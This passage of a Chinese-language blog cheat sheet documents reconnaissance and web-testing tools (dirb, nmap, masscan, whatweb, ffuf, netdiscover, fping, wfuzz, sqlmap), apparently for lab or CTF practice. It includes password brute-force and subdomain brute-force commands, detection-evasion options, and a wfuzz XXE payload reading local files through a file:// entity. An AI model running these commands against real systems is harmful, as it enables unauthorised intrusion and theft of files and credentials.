不区分大小写搜索</span><br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 使用/usr/share/wordlists/dirb/big.txt 字典来扫描Web服务</span><br>dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.118</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/big.txt<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/Qb9qmFXSolACwkY.png" alt="image-20220108130748111"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 设置UA和cookie</span><br>dirb <span class="hljs-keyword">http</span>://<span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.118</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span> -c <span class="hljs-string">&quot;BAIDUID=D5C6351DAC89EF8811A51DF3A9A9C0C4:FG=1; HMACCOUNT=2906306413846532; BIDUPSID=D5C6351DAC89EF8811A51DF3A9A9C0C4; PSTM=1585744543; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; H_PS_PSSID=30974_1438_31124_21098; HMVT=6bcd52f51e9b3dce32bec4a3997715ac|1587436663|; delPer=0; PSINO=6; BDRCVFR[gltLrB7qNCt]=mk3SLVN4HKm&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/EPZACtFYoLxBfbz.png" alt="image-20220108131009205"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 对每个字典添加.dist后缀并延迟100ms,输出保存至test.txt</span><br><span class="hljs-attribute">dirb</span> http://<span class="hljs-number">192.168.56.118</span>  -X .dist -z <span class="hljs-number">100</span> -o test.txt<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/3io2NwByrspKOXz.png" alt="image-20220108131242372"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 使用代理</span><br><span class="hljs-attribute">dirb</span> http://192.168.1.116  -p IP:port<br></code></pre></td></tr></table></figure><p><strong>参考链接</strong></p><h3 id="3、nmap"><a href="#3、nmap" class="headerlink" title="3、nmap"></a>3、nmap</h3><p>功能:扫描神器</p><p>用法：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-literal">-</span>p 指定端口,-p22,80;指定协议，-p http,mysql<br><span class="hljs-literal">-</span>A 用于使用进攻性（Aggressive）方式扫描:端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测，当扫描到未知端口时会进行指纹识别。<br><span class="hljs-literal">-</span>sC 等价于–script=default，使用默认类别的脚本进行扫描服务<br><span class="hljs-literal">-</span>sn Ping Scan - disable port scan,只进行主机发现，不进行端口扫描<br><span class="hljs-literal">-</span>sT tcp扫描<br><span class="hljs-literal">-</span>Pn 跳过主机发现，默认主机开启，直接扫描端口，不触发防火墙,通常检查一个ip开启那些端口<br><span class="hljs-literal">-</span>PR ARP Ping<br><span class="hljs-literal">-</span>T 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，在网络通讯状况较好的情况下推荐使用T4。<br><span class="hljs-literal">-</span>sV IP 判断服务端口、服务名和版本<br><span class="hljs-literal">-</span>sP IP ping扫描探测主机存活<br><span class="hljs-literal">-</span>S &lt;源地址&gt; 定义扫描源地址，为了不被发现<br><span class="hljs-literal">-</span>O IP 操作系统扫描<br><span class="hljs-literal">-</span>e 指定网卡<br><span class="hljs-literal">-</span>-iflist 输出网卡信息<br><span class="hljs-literal">-</span>-host-timeout 主机超时时间 通常选值：18000<br><span class="hljs-literal">-</span>-scan-delay 报文时间间隔 通常选值：1000<br><span class="hljs-comment">#输出</span><br><span class="hljs-literal">-</span>oN &lt;File&gt;<br><span class="hljs-literal">-</span>oX &lt;XML File&gt;<br><span class="hljs-literal">-</span>oG &lt;filespec&gt;<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">常用：<br>nmap -sS -<span class="hljs-selector-tag">A</span> -sC -sV -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-attr">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.111</span><br></code></pre></td></tr></table></figure><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nmap</span> -<span class="hljs-built_in">p1</span>-<span class="hljs-number">65535</span> <span class="hljs-built_in">IP</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sn -PR -T4 <span class="hljs-number">192.168.56.0</span>/<span class="hljs-number">24</span> <br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/sMJ9w3BIWpH74b2.png" alt="image-20220109133211323"></p><p><strong>参考链接</strong></p><p><a href="https://blog.csdn.net/qq_35258210/article/details/113564756">nmap常用参数使用</a></p><h3 id="4、masscan"><a href="#4、masscan" class="headerlink" title="4、masscan"></a>4、masscan</h3><p>功能：快速扫描端口，只能扫描端口</p><p>用法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">格式：masscan &lt;ip addresses/ranges&gt; -p ports <span class="hljs-keyword">options</span><br><span class="hljs-comment">--adapter-ip 指定发包的IP地址</span><br><span class="hljs-comment">--adapter-port 指定发包的源端口</span><br><span class="hljs-comment">--adapter-mac 指定发包源MAC地址</span><br><span class="hljs-comment">--router-mac 指定网关MAC地址</span><br><span class="hljs-comment">--exclude IP地址范围黑名单文件</span><br><span class="hljs-comment">--excludefile 指定IP地址范围黑名单文件</span><br><span class="hljs-comment">--includefile,-L 读取一个范围列表继续扫描</span><br><span class="hljs-comment">--wait 指定发包之后等待时间，默认为10m</span><br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 扫描全部端口</span><br><span class="hljs-attribute">masscan</span> -p <span class="hljs-number">0</span>-<span class="hljs-number">65535</span> <span class="hljs-number">10.35.0.133</span> --rate=<span class="hljs-number">2000</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/1233d2d2afb84ce7b2a33b6e14de9387.png" alt="image-20220116122150712"></p><h3 id="5、whatweb"><a href="#5、whatweb" class="headerlink" title="5、whatweb"></a>5、whatweb</h3><p>功能：扫描网站指纹</p><p>用法：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs diff">格式：whatweb [options] &lt;URLs&gt;<br><span class="hljs-deletion">-version 查看whatweb版本</span><br>IP 简要输出<br><span class="hljs-deletion">-v IP 详细输出</span><br><span class="hljs-deletion">-input-file=路径 从外部导入目标数据进行批量探测</span><br><span class="hljs-deletion">-i 路径 从外部导入目标数据进行批量探测</span><br><span class="hljs-deletion">-log-xml=result.xml 根据特定的格式探测的结果导出</span><br><span class="hljs-deletion">-url-prefix 添加前缀</span><br><span class="hljs-deletion">-url-suffix 添加后缀</span><br><span class="hljs-deletion">-url-pattern 在中间插入内容</span><br><span class="hljs-deletion">-proxy-user admin:password url 以指定用户名和密码进行探测</span><br><span class="hljs-deletion">-c=cookie值 url 通过-c,指定cookie的值</span><br><span class="hljs-deletion">-l 列出插件的列表,包括插件以及插件的描述</span><br><span class="hljs-deletion">-info-plugins=&quot;Zoom&quot; 具体查看插件的内容</span><br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 查看指定地址详细网站信息</span><br>whatweb <span class="hljs-punctuation">-</span>v http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.56.118</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/zCy2PUAhb1XkY4i.png" alt="image-20220108131632157"></p><h3 id="5、arp-scan"><a href="#5、arp-scan" class="headerlink" title="5、arp-scan"></a>5、arp-scan</h3><p><strong>功能：</strong>ARP扫描</p><h3 id="6、ffuf"><a href="#6、ffuf" class="headerlink" title="6、ffuf"></a>6、ffuf</h3><p><strong>功能：</strong></p><pre><code class="hljs">    • 目录发现，可选择在 URL 中的任何位置进行模糊测试。    • 子域名发现    • 使用各种 HTTP 方法进行模糊测试。</code></pre><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff">格式：ffuf [options]<br><span class="hljs-deletion">-u url地址</span><br><span class="hljs-deletion">-w 设置字典</span><br><span class="hljs-deletion">-c 将响应状态码用颜色区分，windows下无法实现该效果。</span><br><span class="hljs-deletion">-t 线程率，默认40</span><br><span class="hljs-deletion">-p 请求延时： 0.1、0.2s</span><br><span class="hljs-deletion">-ac 自动校准fuzz结果</span><br><span class="hljs-deletion">-H Header头，格式为 “Name: Value”</span><br><span class="hljs-deletion">-X HTTP method to use</span><br><span class="hljs-deletion">-d POST data</span><br><span class="hljs-deletion">-r 跟随重定向</span><br><span class="hljs-deletion">-recursion num 递归扫描</span><br><span class="hljs-deletion">-x 设置代理 http 或 socks5://127.0.0.1:8080</span><br><span class="hljs-deletion">-s 不打印附加信息，简洁输出</span><br><span class="hljs-deletion">-e 设置脚本语言 -e .asp,.php,.html,.txt等</span><br><span class="hljs-deletion">-o 输出文本</span><br><span class="hljs-deletion">-of 输出格式文件，支持html、json、md、csv、或者all</span><br></code></pre></td></tr></table></figure><p><strong>基础用法：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.187</span><span class="hljs-regexp">/FUZZ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/836bfd12664b4e528b18a7e3fa7eeb7a.png" alt="image-20220223221522870"></p><p><strong>递归扫描：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.187</span><span class="hljs-regexp">/FUZZ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt -recursion <span class="hljs-string">&quot;2&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/a67310b35c5f4394b42363ab0a3859b3.png" alt="image-20220225090616678"></p><p><strong>进阶用法：</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">-maxtime 在有限的时间内完成测试，不论是否完成都将终止，单位为s，<br>尽量使用<span class="hljs-strong">**-maxtime-job与-recursion**</span>递归扫描一起使用，用于指定每个目录递归扫描时间，避免扫描时间过长<br></code></pre></td></tr></table></figure><p><strong>匹配输出：</strong></p><p>ffuf提供了仅获取具有特定特征的状态码、行数、响应大小、字数以及匹配正则表达式的模式进行响应输出</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-mc 指定状态代码。</span><br><span class="hljs-deletion">-ml 指定响应行数</span><br><span class="hljs-deletion">-mr 指定正则表达式模式</span><br><span class="hljs-deletion">-ms 指定响应大小</span><br><span class="hljs-deletion">-mw 指定响应字数</span><br></code></pre></td></tr></table></figure><p>匹配响应状态码为200，301进行输出</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.187</span><span class="hljs-regexp">/FUZZ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt -mc <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/b2e02861030c43cfb1cfef5f96a235dd.png" alt="image-20220225090823792"></p><p><strong>过滤输出：</strong></p><p>不输出具有特定特征的状态码状态码、行数、响应大小、字数以及匹配正则表达式的模式的输出</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fc 按状态码过滤</span><br><span class="hljs-deletion">-fl 按行数过滤</span><br><span class="hljs-deletion">-fs 按响应大小过滤</span><br><span class="hljs-deletion">-fw 按字数过滤</span><br><span class="hljs-deletion">-fr 按正则表达式模式过滤</span><br></code></pre></td></tr></table></figure><p>不输出响应状态码为200</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.187</span><span class="hljs-regexp">/FUZZ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt -fc<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/8c298d48fd7b44a28efb3cd9d2c6ea37.png" alt="image-20220225091335288"></p><p><strong>对多个域名进行目录发现</strong></p><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">ffuf -w dict.txt:FUZZ -w /targets.txt:URL -u URLFUZZ -mc <span class="hljs-number">200</span> -of csv -o resule.txt<br></code></pre></td></tr></table></figure><p>这里解释一下，-w dict.txt 读取字典文件dict.txt，命名为FUZZ，targets.txt命名为URL，攻击目标为URL与FUZZ的拼接URLFUZZ，当然这要求URL末尾为&#x2F;，否则只能以URL&#x2F;FUZZ为目标攻击。</p><p><strong>子域名爆破</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ffuf</span> -w subdomains.txt -u http://website.com/ -H <span class="hljs-string">&quot;Host:FUZZ.website.com&quot;</span><br></code></pre></td></tr></table></figure><p><strong>密码爆破&amp;接口&amp;参数模糊测试</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">ffuf -w wordlist.txt -X <span class="hljs-keyword">POST</span> -<span class="hljs-keyword">d</span> <span class="hljs-string">&quot;username=admin\&amp;password=FUZZ&quot;</span> -<span class="hljs-keyword">u</span> http:<span class="hljs-comment">//website.com/FUZZ</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ffuf -request poc<span class="hljs-selector-class">.txt</span> -request-proto http -mode clusterbomb -w ./test<span class="hljs-selector-class">.txt</span>:HFUZZ -w test<span class="hljs-selector-class">.txt</span>:WFUZZ -<span class="hljs-attribute">x</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">-mode 爆破模块，目前有clusterbomb 、 pitchfork 两个模式具体看burpsuite的爆破模块<br><br>在clusterbomb模式下，用户名单词列表中的每个单词都将与密码单词列表中的每个单词组合使用。就像如果列表<span class="hljs-number"> 1 </span>中有<span class="hljs-number"> 4 </span>个单词而列表<span class="hljs-number"> 2 </span>中有<span class="hljs-number"> 5 </span>个单词，那么总共会有<span class="hljs-number"> 20 </span>个请求。<br><br>在pitchfork模式下，用户名列表中第一个单词将与密码列表中第一个单词一起使用，同样，用户名列表中第二个单词将与密码列表中第二个单词一起使用。如果两个列表中的单词数量不同，那么一旦单词数量较少的列表耗尽就会停止。<br><br>-request 标志可用于指定与原始HTTP请求文件，并且将相应使用FUZZ<br><br>-request-proto 与原始请求一起使用的协议（默认值：https）<br></code></pre></td></tr></table></figure><p><strong>HTTP请求爆破</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -c -X FUZZ -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz<span class="hljs-regexp">/general/</span>http_methods.txt -u <span class="hljs-variable">$url</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/5f0dded9a3cf47f987635b70012e82f1.png" alt="image-20220928101832937"></p><h3 id="7、Netdiscover"><a href="#7、Netdiscover" class="headerlink" title="7、Netdiscover"></a>7、Netdiscover</h3><p><strong>功能：</strong>二层发现工具，拥有主动和被动发现两种方式。</p><p><strong>用法：</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs diff">格式:netdiscover [options]<br><span class="hljs-deletion">-p 被动模式。默默的侦听指定的网卡以发现别的二层主机，不发送任何数据</span><br><span class="hljs-deletion">-t ARP包发送间隔。单位毫秒。这个可以用来规避检测系统的告警。</span><br><span class="hljs-deletion">-l file: 指定扫描范围列表文件</span><br><span class="hljs-deletion">-p passive mode: 使用被动扫描的方式，不发送任何数据</span><br><span class="hljs-deletion">-m file: 扫描已知 mac 地址和主机名的电脑列表</span><br><span class="hljs-deletion">-F filter: 指定 pcap 筛选器表达式(默认:“arp”)</span><br><span class="hljs-deletion">-s time: 每个 arp 请求之间的睡眠时间(毫秒)</span><br><span class="hljs-deletion">-n node: 使用八字节的形式扫描(2 - 253)</span><br><span class="hljs-deletion">-c count: 发送 arp 请求的时间次数</span><br><span class="hljs-deletion">-f: 使用主动模式的扫描</span><br><span class="hljs-deletion">-d: 忽略配置文件</span><br><span class="hljs-deletion">-S: 启用每个 arp 请求之间抑制的睡眠时间</span><br><span class="hljs-deletion">-P: 打印结果</span><br><span class="hljs-deletion">-N: 不打印头。只有启用- p时有效。</span><br><span class="hljs-deletion">-L: 将捕获的信息输出(-P)，并继续进行扫描</span><br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 扫描eth1网卡指定网段</span><br><span class="hljs-attribute">netdiscover</span> -i et<br></code></pre></td></tr></table></figure><h3 id="8、Fping"><a href="#8、Fping" class="headerlink" title="8、Fping"></a>8、Fping</h3><p><strong>功能：</strong>通过ICMP（网络控制信息协议InternetControl Message Protocol）协议回复请求以检测主机是否存在</p><p><strong>用法：</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs diff">格式：fping [ options ] [ systems... ]<br><span class="hljs-deletion">-a 显示可ping通的目标</span><br><span class="hljs-deletion">-A 将目标以ip地址的形式显示</span><br><span class="hljs-deletion">-b &lt;num&gt; ping 数据包的大小。（默认为56）</span><br><span class="hljs-deletion">-B &lt;f&gt; 设置指数反馈因子到f</span><br><span class="hljs-deletion">-c &lt;num&gt; ping每个目标的次数 (默认为1)</span><br><span class="hljs-deletion">-C &lt;num&gt; 同-c，返回的结果为冗长格式</span><br><span class="hljs-deletion">-e 显示返回数据包所费时间</span><br><span class="hljs-deletion">-f &lt;file&gt; 从文件获取目标列表( - 表示从标准输入)(不能与 -g 同时使用)</span><br><span class="hljs-deletion">-g 通过指定开始和结束地址来生成目标列表（例如：./fping –g 192.168.1.0 192.168.1.255）或者一个IP/掩码形式（例如：./fping –g 192.168.1.0/24）</span><br><span class="hljs-deletion">-i &lt;num&gt; 设置ip的TTL值 (生存时间)</span><br><span class="hljs-deletion">-l 循环发送ping</span><br><span class="hljs-deletion">-m ping目标主机的多个网口</span><br><span class="hljs-deletion">-n 将目标以主机名或域名显示(等价于 -d )</span><br><span class="hljs-deletion">-p &lt;num&gt; 对同一个目标的ping包间隔(毫秒) (在循环和统计模式中，默认为1000)</span><br><span class="hljs-deletion">-q 安静模式(不显示每个目标或每个ping的结果)</span><br><span class="hljs-deletion">-Q &lt;num&gt; 同-q, 但是每n秒显示信息概要</span><br><span class="hljs-deletion">-r &lt;num&gt; 当ping失败时，最大重试次数(默认为3次)</span><br><span class="hljs-deletion">-s 打印最后的统计数据</span><br><span class="hljs-deletion">-t &lt;num&gt; 单个目标的超时时间(毫秒)(默认500)</span><br><span class="hljs-deletion">-u 显示不可到达的目标</span><br></code></pre></td></tr></table></figure><h3 id="9、wfuzz"><a href="#9、wfuzz" class="headerlink" title="9、wfuzz"></a>9、wfuzz</h3><p><strong>功能：</strong>Wfuzz 是一款Python开发的Web安全测试工具，它不仅仅是一个web扫描器：wfuzz能够通过发现并利用网站弱点&#x2F;漏洞的方式帮助你使网站更加安全。wfuzz的漏洞扫描功能由插件支持。</p><p><strong>用法:</strong></p><p><a href="https://blog.csdn.net/weixin_45059752/article/details/122359921">最不详细的Wfuzz使用(一)o((＞ω＜ ))o</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs diff">基础命令<br><span class="hljs-deletion">-b &quot;cookie=&quot; 设置cookie</span><br><span class="hljs-deletion">-c 带颜色显示</span><br><span class="hljs-deletion">-d &quot;username=admin&quot; 设置post内容</span><br><span class="hljs-deletion">-H &quot;User-Agent:&quot; 设置请求头</span><br><span class="hljs-deletion">-R 1 设置递归深度</span><br><span class="hljs-deletion">-s 设置请求间隔时间</span><br><span class="hljs-deletion">-t 设置线程，默认为10</span><br><span class="hljs-deletion">-X GET 设置请求方法,默认为GET请求</span><br><span class="hljs-deletion">-z 设置payload</span><br>-z file 导入paylaod文件<br>-z range,1-10 范围形式1-10<br>-z list 1-2-3-4 列表形式,1,2,3,4<br>显示或隐藏信息<br><span class="hljs-deletion">--hc 503 隐藏响应码为503的数据包</span><br><span class="hljs-deletion">--hl 20  隐藏响应长度为20行的数据包</span><br><span class="hljs-deletion">--hw 30  隐藏响应单词数为30的数据包</span><br><span class="hljs-deletion">--hh 50  隐藏响应信息中字符数为50的数据包</span><br>使用 --sc --sl --sw --sh 可以特别显示相应结果<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><p><strong>任意文件读取</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -d &#x27;<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///home/david/FUZZ&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span><span class="hljs-symbol">&amp;file;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span>&#x27; --hh 85 http://10.35.153.34/magic.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/09881e4f15d240e1882e14c9abe6dd91.png" alt="image-20220628194307797"></p><p>发现用户目录下的.viminfo(vi程序的信息文件，主要用于记录vi的状态信息)文件，访问看看。</p><p><img src="https://img-blog.csdnimg.cn/direct/a8671955ee1f4ee6ade7689debf6784b.png" alt="image-20220628194503752"></p><p><strong>模糊测试请求方法</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">wfuzz -z list,<span class="hljs-string">&quot;<span class="hljs-keyword">PUT</span>-<span class="hljs-keyword">POST</span>-<span class="hljs-keyword">HEAD</span>-<span class="hljs-keyword">OPTIONS</span>-<span class="hljs-keyword">TRACE</span>-<span class="hljs-keyword">GET</span>&quot;</span> -X FUZZ $url<br>或使用seclist的方法字典<br>wfuzz -w /usr/share/seclists/Fuzzing/http-request-methods.txt -X FUZZ $url<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/e1edaa5bcf9b4c7c8316fbb446888f79.png" alt="image-20220928100634603"></p><h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h2 id="三、web程序"><a href="#三、web程序" class="headerlink" title="三、web程序"></a>三、web程序</h2><h3 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1.sqlmap"></a>1.sqlmap</h3><p>功能：</p><p>用法：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ada">格式：<br><span class="hljs-comment">--is-dbs 当前用户权限</span><br><span class="hljs-comment">--dbs 所有数据库</span><br><span class="hljs-comment">--current-db 网站当前数据库</span><br><span class="hljs-comment">--users 所有数据库用户</span><br><span class="hljs-comment">--current-user 当前数据库用户</span><br><span class="hljs-comment">--random-agent 构成随机的user-agent</span><br><span class="hljs-comment">--passwords 